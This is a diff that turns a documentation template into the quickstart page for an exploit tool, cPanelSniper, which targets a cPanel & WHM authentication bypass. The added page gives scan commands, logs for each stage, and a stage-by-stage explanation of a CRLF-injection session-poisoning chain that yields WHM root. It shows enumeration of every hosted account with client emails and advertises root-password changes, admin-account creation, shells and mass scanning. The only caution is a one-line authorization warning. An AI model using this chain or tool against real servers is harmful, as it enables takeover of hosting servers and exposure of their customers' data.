@@ -1,81 +1,110 @@
 ---
-title: "Quickstart"
-description: "Start building awesome documentation in minutes"
-icon: 'rocket'
+title: "Get Started with cPanelSniper: Scan Your First Target"
+description: "Learn how to scan a single cPanel & WHM target for CVE-2026-41940 and confirm root access in under 60 seconds using cPanelSniper."
 ---
 
-## Get started in three steps
+This guide walks you through scanning a single cPanel & WHM target, interpreting the output at each stage of the exploit chain, and understanding what a confirmed bypass looks like. The full 4-stage exploit chain completes in a few seconds on a reachable target; the example output below is taken directly from the tool's real scan output.
 
-Get your documentation site running locally and make your first customization.
+<Warning>
+  Only scan systems you are explicitly authorized to test. Unauthorized use is illegal. See [the disclaimer](/reference/disclaimer) before proceeding.
+</Warning>
 
-### Step 1: Set up your local environment
+## Scan a single target
 
-<AccordionGroup>
-  <Accordion icon="copy" title="Clone your docs locally">
-    During the onboarding process, you created a GitHub repository with your docs content if you didn't already have one. You can find a link to this repository in your [dashboard](https://dashboard.mintlify.com).
-    
-    To clone the repository locally so that you can make and preview changes to your docs, follow the [Cloning a repository](https://docs.github.com/en/repositories/creating-and-managing-repositories/cloning-a-repository) guide in the GitHub docs.
-  </Accordion>
-  <Accordion icon="rectangle-terminal" title="Start the preview server">
-    1. Install the Mintlify CLI: `npm i -g mint`
-    2. Navigate to your docs directory and run: `mint dev`
-    3. Open `http://localhost:3000` to see your docs live!
-    
-    <Tip>Your preview updates automatically as you edit files.</Tip>
-  </Accordion>
-</AccordionGroup>
+<Steps>
+  <Step title="Run a basic scan">
+    Point cPanelSniper at a single WHM target using the `-u` flag. WHM typically listens on port 2087:
 
-### Step 2: Deploy your changes
+    ```bash
+    python3 cPanelSniper.py -u https://target.com:2087
+    ```
 
-<AccordionGroup>
-  <Accordion icon="github" title="Install our GitHub app">
-    Install the Mintlify GitHub app from your [dashboard](https://dashboard.mintlify.com/settings/organization/github-app).
-    
-    Our GitHub app automatically deploys your changes to your docs site, so you don't need to manage deployments yourself.
-</Accordion>
-<Accordion icon="palette" title="Update your site name and colors">
-    For a first change, let's update the name and colors of your docs site.
+    cPanelSniper will print its banner, display the scan configuration, then begin the 4-stage exploit chain. All stage output is written to stderr; structured results go to stdout.
+  </Step>
 
-    1. Open `docs.json` in your editor.
-    2. Change the `"name"` field to your project name.
-    3. Update the `"colors"` to match your brand.
-    4. Save and see your changes instantly at `http://localhost:3000`.
+  <Step title="Watch the exploit chain execute">
+    The tool logs each stage as it runs. A successful scan against a vulnerable target produces output like this:
 
-    <Tip>Try changing the primary color to see an immediate difference!</Tip>
-  </Accordion>
-</AccordionGroup>
+    ```
+    14:46:22 [SCAN] Starting 4-stage exploit chain... https://target.com:2087
+    14:46:23 [INFO] Canonical hostname discovered: srv01.target.com
+    14:46:23 [STEP] Stage 1/4 — Minting preauth session...
+    14:46:23 [  OK] Stage1: preauth session = :QFB4o8XENBqlr6U1...
+    14:46:23 [STEP] Stage 2/4 — CRLF injection via Authorization header...
+    14:46:24 [  OK] Stage2: HTTP 307 → token=/cpsess8493537756
+    14:46:24 [STEP] Stage 3/4 — Firing do_token_denied gadget (raw→cache)...
+    14:46:25 [  OK] Stage3: HTTP 401 — do_token_denied gadget fired
+    14:46:25 [STEP] Stage 4/4 — Verifying WHM root access...
+    14:46:26 [PWND] CVE-2026-41940 CONFIRMED — WHM root access!
+    14:46:26 [PWND]   Token    : /cpsess8493537756
+    14:46:26 [PWND]   Version  : 11.130.0.6
+    14:46:26 [PWND]   API URL  : https://target.com:2087/cpsess8493537756/json-api/version
+    ```
 
-### Step 3: Go live
+    Each stage maps to a distinct step in the exploit chain:
 
-<Accordion icon="rocket" title="Publish your docs">
-  1. Commit and push your changes.
-  2. Your docs will update and be live in moments!
-</Accordion>
+    - **Stage 1** — POSTs intentionally wrong credentials to `/login/?login_only=1` to obtain a `whostmgrsession` cookie without authentication
+    - **Stage 2** — Sends the CRLF-poisoned `Authorization: Basic` header; cPanel writes the injected fields into the session file and returns a 307 with the session token
+    - **Stage 3** — Hits `/scripts2/listaccts` to trigger the `do_token_denied` gadget, which flushes the raw session data into the session cache; the expected response is HTTP 401
+    - **Stage 4** — Calls `/cpsessXXXXXXXXXX/json-api/version`; a 200 response with `"version"` in the body confirms full WHM root access
+  </Step>
+
+  <Step title="Read the scan summary">
+    After all stages complete, cPanelSniper prints a structured summary:
+
+    ```
+    ══════════════════════════════════════════════════════════════════════
+      cPanelSniper — Scan Complete
+      Time: 5.8s  ·  Targets: 1
+
+      ⚡ 1 VULNERABLE TARGET(S)
+
+      Target   : https://target.com:2087
+      Version  : 11.130.0.6
+      Token    : /cpsess8493537756
+      API URL  : https://target.com:2087/cpsess8493537756/json-api/version
+    ══════════════════════════════════════════════════════════════════════
+    ```
+
+    The `[PWND]` prefix on the stage 4 log and the `VULNERABLE TARGET(S)` line in the summary both confirm a successful authentication bypass. The `Version` field shows the cPanel version running on the target; you can cross-reference it against the [affected versions table](/vulnerability/affected-versions) to confirm whether the target is on a known-vulnerable build.
+  </Step>
+
+  <Step title="Confirm root access with a post-exploit action">
+    To verify root access beyond the version check, run the `list` action to enumerate all cPanel accounts on the server:
+
+    ```bash
+    python3 cPanelSniper.py -u https://target.com:2087 --action list
+    ```
+
+    A successful response lists every hosted account:
+
+    ```
+    14:46:26 [ API] Running post-exploit action: list
+    14:46:27 [ API] listaccts → HTTP 200
+
+      [cPanel Accounts]  target.com:2087 (47 accounts)
+        client01    domain: client01.com    email: admin@client01.com
+        client02    domain: client02.net    email: info@client02.net
+        ...
+    ```
+
+    HTTP 200 from `listaccts` confirms that the injected session has active WHM root privileges.
+  </Step>
+</Steps>
 
 ## Next steps
 
-Now that you have your docs running, explore these key features:
-
 <CardGroup cols={2}>
-
-<Card title="Write Content" icon="pen-to-square" href="/essentials/markdown">
-  Learn MDX syntax and start writing your documentation.
-</Card>
-
-<Card title="Customize style" icon="palette" href="/essentials/settings">
-  Make your docs match your brand perfectly.
-</Card>
-
-<Card title="Add code examples" icon="square-code" href="/essentials/code">
-  Include syntax-highlighted code blocks.
-</Card>
-
-<Card title="API documentation" icon="code" href="/api-reference/introduction">
-  Auto-generate API docs from OpenAPI specs.
-</Card>
-
+  <Card title="Post-exploit actions" icon="shield-halved" href="/usage/post-exploit">
+    Run OS commands, change the root password, gather server info, and create admin accounts.
+  </Card>
+  <Card title="Interactive WHM shell" icon="display" href="/usage/interactive-shell">
+    Drop into a persistent interactive shell for manual exploration of the compromised server.
+  </Card>
+  <Card title="Bulk scanning" icon="list" href="/usage/scanning">
+    Scan multiple targets concurrently with `-l targets.txt` and save results to JSON.
+  </Card>
+  <Card title="Pipeline usage" icon="pipe-section" href="/usage/pipelines">
+    Chain cPanelSniper with subfinder, httpx, and Shodan for automated recon-to-exploit workflows.
+  </Card>
 </CardGroup>
-
-<Note>
-  **Need help?** See our [full documentation](https://mintlify.com/docs) or join our [community](https://mintlify.com/community).
-</Note>
